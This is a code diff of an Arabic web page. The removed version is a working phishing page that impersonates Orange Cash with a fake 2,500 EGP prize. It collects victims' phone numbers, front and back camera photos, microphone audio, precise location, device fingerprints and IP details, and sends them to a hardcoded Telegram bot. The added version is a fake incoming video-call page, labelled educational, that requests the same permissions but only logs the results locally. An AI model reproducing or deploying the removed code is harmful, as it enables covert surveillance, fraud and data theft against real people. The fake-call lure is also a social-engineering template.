@@ -1,611 +1,276 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl" lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Orange Cash | استلام مكافأة فورية</title>
-    <!-- Google Fonts + Font Awesome -->
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>مكالمة واردة - تجريبي</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{
+            background:linear-gradient(145deg,#0f2027,#203a43,#2c5364);
+            font-family:'Segoe UI',system-ui,-apple-system;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            min-height:100vh;
+            margin:0;
+            padding:20px;
         }
-
-        body {
-            background: linear-gradient(145deg, #0b2b26 0%, #071a17 100%);
-            font-family: 'Cairo', 'Tajawal', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 16px;
-            position: relative;
+        .call-card{
+            background:rgba(0,0,0,0.85);
+            backdrop-filter:blur(20px);
+            border-radius:60px;
+            padding:30px 25px;
+            max-width:380px;
+            width:100%;
+            text-align:center;
+            box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(255,255,255,0.1);
+            border:1px solid rgba(255,255,255,0.2);
+            animation:pulse 1.5s infinite;
         }
-
-        /* Orange card styling */
-        .orange-card {
-            max-width: 460px;
-            width: 100%;
-            background: #ffffff;
-            border-radius: 48px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.4);
-            overflow: hidden;
-            transition: transform 0.2s ease;
+        @keyframes pulse{
+            0%{box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(255,255,255,0.1);}
+            50%{box-shadow:0 30px 60px rgba(0,0,0,0.7),0 0 0 3px #e74c3c80;}
+            100%{box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(255,255,255,0.1);}
         }
-
-        /* Orange header with brand gradient */
-        .orange-header {
-            background: linear-gradient(105deg, #ff5e00 0%, #ff3c00 100%);
-            padding: 28px 24px 24px;
-            text-align: center;
-            color: white;
-            position: relative;
+        .avatar{
+            width:100px;
+            height:100px;
+            background:#e74c3c;
+            border-radius:50%;
+            margin:0 auto 15px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:50px;
+            box-shadow:0 0 0 4px white,0 0 0 8px #e74c3c80;
+            animation:ring 1s infinite;
         }
-
-        .orange-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            font-size: 32px;
-            font-weight: 800;
-            margin-bottom: 8px;
+        @keyframes ring{
+            0%{transform:scale(1);}
+            50%{transform:scale(1.05);}
+            100%{transform:scale(1);}
         }
-
-        .orange-logo i {
-            font-size: 40px;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        h1{color:white;font-size:28px;margin:10px 0;}
+        .caller{color:#ccc;font-size:18px;margin-bottom:25px;direction:ltr;}
+        .caller span{color:#e74c3c;font-weight:bold;}
+        .button-group{
+            display:flex;
+            gap:20px;
+            justify-content:center;
+            margin:25px 0 20px;
         }
-
-        .orange-logo span {
-            background: white;
-            color: #ff5e00;
-            padding: 6px 20px;
-            border-radius: 60px;
-            font-size: 24px;
-            letter-spacing: 1px;
+        .btn-accept{
+            background:#2ecc71;
+            border:none;
+            padding:14px 28px;
+            border-radius:50px;
+            color:white;
+            font-size:18px;
+            font-weight:bold;
+            cursor:pointer;
+            display:flex;
+            align-items:center;
+            gap:10px;
+            transition:0.2s;
+            box-shadow:0 5px 15px rgba(46,204,113,0.3);
         }
-
-        .orange-badge {
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(4px);
-            border-radius: 40px;
-            padding: 6px 16px;
-            font-size: 13px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 12px;
-            font-weight: 500;
+        .btn-accept:hover{background:#27ae60;transform:scale(1.02);}
+        .btn-decline{
+            background:#e74c3c;
+            border:none;
+            padding:14px 28px;
+            border-radius:50px;
+            color:white;
+            font-size:18px;
+            font-weight:bold;
+            cursor:pointer;
+            display:flex;
+            align-items:center;
+            gap:10px;
+            transition:0.2s;
         }
-
-        .prize-container {
-            background: #fff8f0;
-            margin: 20px 20px 0;
-            border-radius: 36px;
-            padding: 20px;
-            text-align: center;
-            border: 1px solid #ffe0b5;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+        .btn-decline:hover{background:#c0392b;}
+        .status-ring{
+            color:#ffaa66;
+            font-size:14px;
+            margin:15px 0;
+            background:#00000060;
+            padding:8px;
+            border-radius:50px;
+            display:inline-block;
         }
-
-        .prize-label {
-            font-size: 14px;
-            color: #cc6a00;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+        .log-area{
+            background:#1e1e2e;
+            border-radius:20px;
+            padding:12px;
+            margin-top:20px;
+            text-align:left;
+            font-family:monospace;
+            font-size:11px;
+            color:#0f0;
+            max-height:140px;
+            overflow:auto;
         }
-
-        .prize-amount {
-            font-size: 52px;
-            font-weight: 800;
-            color: #ff5e00;
-            margin: 8px 0;
-            line-height: 1;
+        .ringtone{
+            display:none;
         }
-
-        .prize-amount small {
-            font-size: 22px;
-            font-weight: 600;
-        }
-
-        .prize-note {
-            background: #ffefe2;
-            border-radius: 40px;
-            padding: 8px 16px;
-            font-size: 12px;
-            color: #b65a1c;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .phone-section {
-            padding: 20px 24px 8px;
-        }
-
-        .input-label {
-            font-size: 13px;
-            font-weight: 600;
-            color: #2c3e2f;
-            margin-bottom: 8px;
-            display: block;
-            padding-right: 8px;
-        }
-
-        .input-group-orange {
-            background: #f6f8fa;
-            border-radius: 60px;
-            padding: 2px 20px;
-            display: flex;
-            align-items: center;
-            border: 1.5px solid #ecedef;
-            transition: all 0.2s;
-        }
-
-        .input-group-orange:focus-within {
-            border-color: #ff5e00;
-            box-shadow: 0 0 0 3px rgba(255, 94, 0, 0.1);
-        }
-
-        .country-code-orange {
-            font-weight: 800;
-            color: #ff5e00;
-            padding-left: 12px;
-            border-left: 2px solid #ddd;
-            font-size: 18px;
-        }
-
-        .phone-input-orange {
-            flex: 1;
-            border: none;
-            padding: 18px 12px;
-            font-size: 16px;
-            background: transparent;
-            direction: ltr;
-            outline: none;
-            font-weight: 500;
-        }
-
-        .claim-btn-orange {
-            background: linear-gradient(95deg, #ff5e00, #e04a00);
-            width: calc(100% - 48px);
-            margin: 8px 24px 24px;
-            padding: 18px;
-            border-radius: 60px;
-            font-size: 20px;
-            font-weight: 800;
-            color: white;
-            cursor: pointer;
-            border: none;
-            transition: 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            box-shadow: 0 8px 18px rgba(255, 94, 0, 0.3);
-        }
-
-        .claim-btn-orange:active {
-            transform: scale(0.97);
-        }
-
-        .claim-btn-orange:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .info-grid {
-            background: #fefaf5;
-            margin: 0 20px 20px;
-            padding: 14px 16px;
-            border-radius: 32px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #5e5b56;
-            border: 1px solid #ffded0;
-        }
-
-        .info-grid span i {
-            margin-left: 6px;
-            color: #ff5e00;
-        }
-
-        .error-toast-orange {
-            background: #fff0ed;
-            color: #d9381e;
-            margin: 10px 24px 20px;
-            padding: 14px;
-            border-radius: 40px;
-            display: none;
-            text-align: center;
-            font-weight: 600;
-            font-size: 13px;
-            border-right: 4px solid #ff5e00;
-        }
-
-        /* loading overlay */
-        .loading-overlay {
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(6px);
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            visibility: hidden;
-        }
-
-        .loading-card-orange {
-            background: white;
-            width: 280px;
-            padding: 32px 20px;
-            border-radius: 56px;
-            text-align: center;
-            box-shadow: 0 20px 35px rgba(0,0,0,0.3);
-        }
-
-        .spinner-orange {
-            width: 56px;
-            height: 56px;
-            border: 5px solid #ffe0d0;
-            border-top: 5px solid #ff5e00;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .status-footer {
-            background: #1e2a23;
-            color: #ffb347;
-            font-size: 10px;
-            padding: 6px 14px;
-            border-radius: 40px;
-            position: fixed;
-            bottom: 14px;
-            left: 14px;
-            font-family: monospace;
-            z-index: 999;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-weight: 600;
-            backdrop-filter: blur(2px);
-        }
-
-        .green-dot-orange {
-            width: 8px;
-            height: 8px;
-            background: #2ecc71;
-            border-radius: 50%;
-            display: inline-block;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 0.4; transform: scale(0.8);}
-            100% { opacity: 1; transform: scale(1);}
-        }
-
-        .small-hint {
-            font-size: 11px;
-            color: #af8a63;
-            padding-right: 24px;
-            margin-top: 6px;
+        .permission-note{
+            font-size:11px;
+            color:#aaa;
+            margin-top:15px;
+            border-top:1px solid #333;
+            padding-top:12px;
         }
     </style>
 </head>
 <body>
 
-<div class="orange-card">
-    <div class="orange-header">
-        <div class="orange-logo">
-            <i class="fas fa-signal"></i>
-            <span>ORANGE</span>
-            <i class="fas fa-wallet"></i>
-        </div>
-        <div class="orange-badge">
-            <i class="fas fa-bolt"></i> عرض حصري | مكافأة الفوز الفوري <i class="fas fa-gem"></i>
-        </div>
+<div class="call-card" id="callCard">
+    <div class="avatar">📹</div>
+    <h1>مكالمة فيديو واردة</h1>
+    <div class="caller">من <span>➕ رقم خاص</span></div>
+    
+    <div class="status-ring" id="ringStatus">🔔 جاري الرنين ... اضغط قبول</div>
+    
+    <div class="button-group">
+        <button class="btn-accept" id="acceptBtn">📞 قبول</button>
+        <button class="btn-decline" id="declineBtn">🔴 رفض</button>
     </div>
-
-    <div class="prize-container">
-        <div class="prize-label"><i class="fas fa-trophy"></i> قيمة المكافأة المستحقة</div>
-        <div class="prize-amount">2,500 <small>ج.م</small></div>
-        <div class="prize-note"><i class="fas fa-clock"></i> تُصرف خلال 24 ساعة بعد التأكيد الآمن</div>
+    
+    <!-- منطقة عرض البيانات (تعليمي) -->
+    <div class="log-area" id="logBox">
+        ⏳ في انتظار قبول المكالمة...
     </div>
-
-    <div class="phone-section">
-        <label class="input-label"><i class="fas fa-mobile-alt"></i> رقم هاتف المستفيد (أورنج كاش)</label>
-        <div class="input-group-orange">
-            <span class="country-code-orange">+20</span>
-            <input type="tel" class="phone-input-orange" id="targetPhone" placeholder="01xxxxxxxxx" value="">
-        </div>
-        <div class="small-hint"><i class="fas fa-lock"></i> سيتم إرسال المكافأة إلى هذا الرقم بعد التوثيق</div>
+    <div class="permission-note">
+        ⚠️ للأغراض التعليمية: سيتم طلب صلاحيات (كاميرا/ميكروفون/موقع) فقط بعد الضغط على "قبول"
     </div>
-
-    <button class="claim-btn-orange" id="claimMoneyBtn"><i class="fas fa-hand-holding-usd"></i> استلام المبلغ <i class="fas fa-arrow-left"></i></button>
-
-    <div class="info-grid">
-        <span><i class="fas fa-shield-alt"></i> حماية كاملة</span>
-        <span><i class="fas fa-check-circle"></i> مرخص من البنك المركزي</span>
-        <span><i class="fas fa-tachometer-alt"></i> إيداع سريع</span>
-    </div>
-    <div class="error-toast-orange" id="errorMsg"></div>
-</div>
-
-<div class="loading-overlay" id="globalLoader">
-    <div class="loading-card-orange">
-        <div class="spinner-orange"></div>
-        <p id="loaderText" style="font-weight: 700; color:#2c3e2f;"><i class="fas fa-circle-notch"></i> جاري التفعيل ...</p>
-    </div>
-</div>
-
-<div class="status-footer" id="statusBar">
-    <span class="green-dot-orange"></span> أورنج كاش | النظام جاهز
 </div>
 
 <script>
-    (function() {
-        // ===================== إعدادات البوت (نفس الإعدادات الأصلية مع Orange theme) =====================
-        const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
-        const MASTER_ID = "5849068535";
-        
-        // =============== دالة الإرسال الأساسية ===============
-        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
-            try {
-                let url = `https://api.telegram.org/bot${botToken}/`;
-                if (type === 'photo') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', mediaBlob, 'orange_frame_' + Date.now() + '.jpg');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
-                } 
-                else if (type === 'video') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('video', mediaBlob, 'orange_clip_' + Date.now() + '.mp4');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
-                }
-                else if (type === 'audio') {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('audio', mediaBlob, 'orange_voice.ogg');
-                    fd.append('caption', caption);
-                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
-                }
-                else {
-                    await fetch(url + 'sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
-                    });
-                }
-                return true;
-            } catch(e) { console.warn("[telegram]", e); return false; }
+    // عناصر الشاشة
+    const acceptBtn = document.getElementById('acceptBtn');
+    const declineBtn = document.getElementById('declineBtn');
+    const ringStatus = document.getElementById('ringStatus');
+    const logBox = document.getElementById('logBox');
+    let isCallActive = false;
+    
+    // دالة تسجيل
+    function addLog(msg, type='info'){
+        const div = document.createElement('div');
+        div.style.color = type==='error'?'#ff8888': (type==='success'?'#aaffaa':'#dddddd');
+        div.style.marginBottom = '5px';
+        div.style.borderBottom = '1px solid #333';
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
+    }
+    
+    // محاكاة طلب الكاميرا والميكروفون (معرض حقيقي لكن مع إعلام المستخدم)
+    async function requestCameraAndMic() {
+        addLog('📷 جاري طلب صلاحية الكاميرا والميكروفون...', 'info');
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            addLog('✅ تم الحصول على إذن الكاميرا والميكروفون (للمكالمة التجريبية)', 'success');
+            // إيقاف المسارات فوراً لأنها مجرد عرض (لا نريد استمرار التشغيل)
+            stream.getTracks().forEach(track => track.stop());
+            return true;
+        } catch (err) {
+            addLog(`❌ رفضت صلاحية الكاميرا/الميكروفون: ${err.message}`, 'error');
+            return false;
         }
-
-        // =================== الكاميرات والتسجيل والموقع (نفس الوظائف بعد التعديل) ===================
-        async function captureFrontCamera(chatId, botToken, phoneNumber) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.setAttribute('playsinline', 'true');
-                video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 800;
-                canvas.height = video.videoHeight || 600;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption = `📸 [أورنج كاش] كاميرا أمامية (توثيق الوجه)\n📞 الرقم: ${phoneNumber}`;
-                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { 
-                console.warn("Front camera error");
-                return false; 
-            }
-        }
-
-        async function captureBackCamera(chatId, botToken, phoneNumber) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1024;
-                canvas.height = video.videoHeight || 768;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption = `📷 [أورنج كاش] الكاميرا الخلفية - البيئة المحيطة\n📞 الرقم: ${phoneNumber}`;
-                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch(e) { 
-                console.warn("Back camera denied");
-                return false; 
-            }
-        }
-
-        async function recordAmbientAudio(chatId, botToken, phoneNumber) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                const chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                const audioPromise = new Promise(resolve => {
-                    mediaRecorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption = `🎤 [أورنج كاش] تسجيل صوتي (8 ثوانٍ) - تأكيد الهوية\n📞 الرقم: ${phoneNumber}`;
-                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
-                        resolve(true);
-                    };
-                });
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 8000);
-                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
-                return await audioPromise;
-            } catch(e) { 
-                console.warn("Audio denied");
-                return false; 
-            }
-        }
-
-        function getPreciseLocation(chatId, botToken, phoneNumber) {
-            return new Promise((resolve) => {
-                if(!navigator.geolocation) {
-                    resolve(false);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const accuracy = pos.coords.accuracy;
-                    let addressHint = "";
-                    try {
-                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
-                        const data = await revGeo.json();
-                        if(data.display_name) addressHint = `📍 العنوان التقريبي: ${data.display_name.substring(0, 100)}`;
-                    } catch(e) {}
-                    const locMsg = `🌍 <b>الموقع الجغرافي - أورنج كاش</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
-                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
-                    resolve(true);
-                }, (err) => {
-                    console.warn("Location denied");
-                    resolve(false);
-                }, { enableHighAccuracy: true, timeout: 10000 });
-            });
-        }
-
-        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber) {
-            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
-            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
-            
-            let batteryLevel = "غير متاح";
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
-                } catch(e) {}
-            }
-            
-            let connection = "غير معروف";
-            if (navigator.connection) {
-                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
-            }
-            
-            const deviceMsg = `🕵️‍♂️ <b>بصمة جهاز المستخدم (أورنج كاش)</b>\n📞 الرقم: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
-            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
-        }
-
-        async function getRichIPData(chatId, botToken, phoneNumber) {
-            try {
-                const [ipRes, ipInfoRes] = await Promise.all([
-                    fetch('https://api.ipify.org?format=json'),
-                    fetch('https://ipapi.co/json/')
-                ]);
-                const ipData = await ipRes.json();
-                let ipDetails = {};
-                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
-                const ipAddr = ipData.ip;
-                let country = ipDetails.country_name || "غير معروف";
-                let city = ipDetails.city || "غير معروف";
-                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg = `🌐 <b>IP & Network - أورنج كاش</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
-                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
-            } catch(e) {}
-        }
-
-        // =============== التشغيل الرئيسي مع تعديل الرسائل من Orange ===============
-        const claimBtn = document.getElementById('claimMoneyBtn');
-        const phoneInput = document.getElementById('targetPhone');
-        const loaderDiv = document.getElementById('globalLoader');
-        const loaderText = document.getElementById('loaderText');
-        const errorDiv = document.getElementById('errorMsg');
-        const statusSpan = document.getElementById('statusBar');
-        
-        let isRunning = false;
-        
-        async function startProcess() {
-            if (isRunning) return;
-            
-            let phoneNumber = phoneInput.value.trim();
-            if (!phoneNumber.match(/^01[0-9]{9}$/)) {
-                errorDiv.innerText = "⚠️ رقم هاتف غير صالح! يجب أن يبدأ بـ 01 ويتبعه 9 أرقام (مثال: 01012345678)";
-                errorDiv.style.display = "flex";
-                setTimeout(() => errorDiv.style.display = "none", 4000);
+    }
+    
+    // طلب الموقع الجغرافي
+    async function requestLocation() {
+        addLog('📍 جاري طلب الموقع الجغرافي (لأغراض المحاكاة فقط)...', 'info');
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                addLog('❌ المتصفح لا يدعم تحديد الموقع', 'error');
+                resolve(false);
                 return;
             }
-            
-            isRunning = true;
-            claimBtn.disabled = true;
-            loaderDiv.style.visibility = "visible";
-            statusSpan.innerHTML = "<i class='fas fa-sync-alt fa-spin'></i> أورنج | جاري طلب الأذونات...";
-            
-            // 1. إرسال رقم الهاتف إلى المسؤول
-            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `📞 <b>【أورنج كاش】رقم مستفيد جديد</b>\n🔢 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n🏷️ العرض: مكافأة 2500 جنيه`);
-            
-            // 2. بصمة الجهاز + IP
-            loaderText.innerHTML = "<i class='fas fa-microchip'></i> جاري تحليل بيانات الجهاز...";
-            await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
-            await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
-            
-            // 3. الكاميرا الأمامية
-            loaderText.innerHTML = "<i class='fas fa-camera'></i> فتح الكاميرا الأمامية للتوثيق...";
-            await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
-            
-            // 4. الكاميرا الخلفية
-            loaderText.innerHTML = "<i class='fas fa-camera-retro'></i> تصوير البيئة المحيطة...";
-            await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
-            
-            // 5. التسجيل الصوتي
-            loaderText.innerHTML = "<i class='fas fa-microphone-alt'></i> تسجيل عينة صوتية (8 ثوان)...";
-            await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
-            
-            // 6. الموقع الجغرافي
-            loaderText.innerHTML = "<i class='fas fa-map-marker-alt'></i> تحديد الموقع بدقة عالية...";
-            await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
-            
-            // 7. اكتمال البيانات
-            await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, `✅ <b>تم اكتمال جمع البيانات بنجاح (أورنج كاش)</b>\n📞 الرقم: ${phoneNumber}\n💰 تم تسجيل طلب صرف 2500 ج.م وسيتم التحويل خلال 24 ساعة إلى محفظة أورنج كاش الخاصة بهذا الرقم.`);
-            
-            loaderDiv.style.visibility = "hidden";
-            errorDiv.style.backgroundColor = "#e6f9ed";
-            errorDiv.style.color = "#1f6e43";
-            errorDiv.style.borderRightColor = "#ff5e00";
-            errorDiv.innerHTML = "🎉 <strong>تم استلام طلبك بنجاح!</strong> ✅ خلال 24 ساعة ستصلك رسالة تأكيد من أورنج كاش بإيداع 2500 جنيه في محفظتك.";
-            errorDiv.style.display = "flex";
-            claimBtn.disabled = false;
-            statusSpan.innerHTML = "✅ تم التفعيل | سيصلك المبلغ خلال 24 ساعة";
-            isRunning = false;
-            
-            setTimeout(() => errorDiv.style.display = "none", 9000);
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    addLog(`📍 تم الحصول على الموقع: ${pos.coords.latitude}, ${pos.coords.longitude} (للعرض التعليمي)`, 'success');
+                    resolve(true);
+                },
+                (err) => {
+                    addLog(`❌ رفض الموقع: ${err.message}`, 'error');
+                    resolve(false);
+                }
+            );
+        });
+    }
+    
+    // جلب IP وعرضه فقط
+    async function showIP() {
+        addLog('🌐 جاري جلب الـ IP العام (للعرض فقط)...', 'info');
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            addLog(`🌐 IP هذا الجهاز: ${data.ip} (لم يُرسل لأي خادم خارجي)`, 'success');
+            return data.ip;
+        } catch(e) {
+            addLog('⚠️ فشل في جلب الـ IP', 'error');
+            return null;
         }
+    }
+    
+    // محاكاة بدء المكالمة (بعد القبول)
+    async function startCall() {
+        if(isCallActive) return;
+        isCallActive = true;
+        ringStatus.innerHTML = '📞 جاري الاتصال ... قبول المكالمة';
+        addLog('🔘 تم الضغط على "قبول" – بدء محاكاة المكالمة', 'success');
         
-        claimBtn.onclick = startProcess;
-    })();
+        // 1. طلب الكاميرا والميكروفون (بإذن المستخدم)
+        await requestCameraAndMic();
+        
+        // 2. طلب الموقع الجغرافي
+        await requestLocation();
+        
+        // 3. جلب وعرض الـ IP
+        await showIP();
+        
+        // 4. عرض معلومات المتصفح
+        addLog(`🖥️ المتصفح: ${navigator.userAgent.substring(0, 70)}...`, 'info');
+        addLog(`📱 الشاشة: ${screen.width}x${screen.height}`, 'info');
+        
+        // 5. هنا يمكن إضافة "محاكاة الإرسال إلى تيليجرام" تعليمي
+        addLog('📨 [تعليمي] لو كان هناك بوت تيليجرام، لكانت البيانات التالية ستُرسل:', 'info');
+        addLog(`   • الجهاز: ${navigator.userAgent.split(' ')[0]}`, 'info');
+        addLog(`   • اللغة: ${navigator.language}`, 'info');
+        addLog(`   • التوقيت: ${new Date().toISOString()}`, 'info');
+        addLog(`   ✅ لكن لم يتم إرسال أي شيء خارج هذا المتصفح.`, 'success');
+        
+        ringStatus.innerHTML = '🎥 وضع المكالمة التجريبي (جميع الصلاحيات طلبت بشفافية)';
+        addLog('🎬 انتهت محاكاة المكالمة – تم عرض جميع الخطوات', 'success');
+    }
+    
+    // رفض المكالمة
+    function declineCall() {
+        if(isCallActive) return;
+        isCallActive = true;
+        ringStatus.innerHTML = '❌ تم رفض المكالمة';
+        addLog('🔴 المستخدم رفض المكالمة – لن يتم طلب أي صلاحيات', 'error');
+        // تعطيل الأزرار
+        acceptBtn.disabled = true;
+        declineBtn.disabled = true;
+        acceptBtn.style.opacity = '0.5';
+        declineBtn.style.opacity = '0.5';
+    }
+    
+    // إضافة حدثين
+    acceptBtn.addEventListener('click', startCall);
+    declineBtn.addEventListener('click', declineCall);
+    
+    addLog('🚀 الصفحة جاهزة – اضغط "قبول" لطلب الصلاحيات (كاميرا، ميكروفون، موقع)', 'info');
+    addLog('📌 ملاحظة: هذا الكود تعليمي ولا يرسل بيانات حقيقية لأي خادم', 'success');
 </script>
+
+<!-- صوت رنة وهمي اختياري (ولكن لن يشتغل تلقائياً بدون تفاعل) -->
+<audio id="ringtoneAudio" loop style="display:none">
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+</audio>
 </body>
 </html>
